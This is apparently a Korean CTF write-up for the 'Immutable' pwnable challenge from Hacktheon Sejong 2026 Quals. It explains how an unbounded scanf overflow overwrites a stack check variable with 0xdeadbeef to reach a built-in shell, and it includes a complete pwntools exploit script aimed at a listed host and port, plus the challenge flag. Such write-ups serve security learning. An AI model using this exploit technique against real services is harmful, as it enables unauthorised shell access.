---
title: "Hacktheon Sejong 2026 Quals Immutable Writeup"
published: 2026-04-28
description: "Hacktheon Sejong 2026 Quals Immutable 문제 풀이."
category: "CTF/Wargame"
tags: ["Hacktheon Sejong", "CTF", "Writeup", "Pwnable"]
draft: false
listed: false
---

# Immutable

### Summary

`scanf("%s", buf)`가 길이 제한 없이 입력을 받는다. return address까지 가지 않아도 된다. stack canary 바로 앞의 local check 변수만 `0xdeadbeef`로 바꾸면 바이너리 안에 준비된 `system("/bin/sh")` 경로가 열린다.

### Analysis

보호기법은 Full RELRO, Canary, NX, PIE가 모두 켜져 있었다. 여기서는 제어 흐름을 빼앗는 문제가 아니라, 조건문이 보는 stack local 값을 덮는 문제였다.

스택 배치는 `buf`가 `[rbp-0x90]`, 비교 변수가 `[rbp-0x10]`, canary가 `[rbp-0x8]`에 놓이는 형태다. `0x80`바이트를 채운 뒤 `p32(0xdeadbeef)`를 붙이면 canary는 건드리지 않고 비교 변수만 바뀐다.

`system("/bin/sh")` 호출은 이미 바이너리 안에 있다. payload를 보낸 뒤 shell에서 flag를 읽으면 끝난다.

### Exploit

```python
#!/usr/bin/env python3
from pwn import *


HOST = args.HOST or "3.37.44.62"
PORT = int(args.PORT or 33201)


def main():
    payload = b"A" * 0x80 + p32(0xDEADBEEF)

    io = remote(HOST, PORT)
    io.recvuntil(b"input: ")
    io.sendline(payload)
    io.sendline(b"cat flag; exit")
    print(io.recvall(timeout=3).decode("latin-1"), end="")


if __name__ == "__main__":
    main()
```

### Flag

`hacktheon2026{ed2190f6865ca1e3fea816b296445228064a51ec9492b518f514a60624f43d850738dd60b2c9d0893cb5c30f7d1efeaa575527f0b8534a96aa170356d2f8e2d0f3da4b43880faa71}`
